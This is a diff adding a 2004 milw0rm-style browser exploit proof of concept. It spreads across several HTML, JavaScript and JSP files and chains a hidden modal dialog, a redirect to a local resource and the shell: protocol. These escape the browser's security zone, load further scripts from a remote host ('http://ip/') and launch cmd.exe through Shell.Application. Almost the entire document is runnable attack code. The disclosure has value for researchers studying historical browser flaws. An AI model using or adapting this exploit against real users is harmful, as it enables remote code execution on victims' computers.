@@ -1,0 +1,61 @@
+<html>
+<body>
+
+<script language="Javascript">
+
+function InjectedDuringRedirection(){
+showModalDialog('md.htm',window,"dialogTop:-10000\;dialogLeft:-10000\;dialogHeight:1\;
+dialogWidth:1\;").location="vbscript:\"<SCRIPT SRC='http://ip/shellscript_loader.js'><\/script>\"";
+}
+
+</script>
+
+<script language="javascript">
+
+setTimeout("myiframe.execScript(InjectedDuringRedirection.toString())",100);
+setTimeout("myiframe.execScript('InjectedDuringRedirection()') ",101);
+document.write('<IFRAME ID=myiframe NAME=myiframe SRC="redir.jsp" style=display:none;></IFRAME>');
+
+</script>
+
+</body>
+</html>
+
+--------------------------------------------------------- md.htm  ---------------------------------------------------------
+<SCRIPT language="javascript">
+
+window.returnValue = window.dialogArguments;
+
+function CheckStatus(){
+try{tempVar=window.dialogArguments.location.href;}catch(e){window.close();}
+setTimeout("CheckStatus()",100);
+}
+
+CheckStatus();
+
+</SCRIPT>
+
+--------------------------------------------------- shellscript_loader.js  ---------------------------------------------------
+function getRealShell() {
+myiframe.document.write("<SCRIPT SRC='http://ip/shellscript.js'><\/SCRIPT>");
+}
+
+document.write("<IFRAME ID=myiframe SRC='about:blank' WIDTH=200 HEIGHT=200></IFRAME>");
+setTimeout("getRealShell()",100);
+
+------------------------------------------------------- shellscript.js  -------------------------------------------------------
+function injectIt() {
+document.frames[0].document.body.insertAdjacentHTML('afterBegin','injected<script language=
+"JScript" DEFER>var obj=new ActiveXObject("Shell.Application");obj.ShellExecute("cmd.exe","/c pause");</script>');
+}
+document.write('<iframe src="shell:WINDOWS\\Web\\TIP.HTM"></iframe>');
+setTimeout("injectIt()", 1000);
+
+--------------------------------------------------------- redir.jsp  ----------------------------------------------------------
+<% Thread.sleep(1500);
+response.setStatus(302);
+response.setHeader("Location", "URL:res://shdoclc.dll/HTTP_501.htm"); 
+%>
+
+
+# milw0rm.com [2004-07-09]
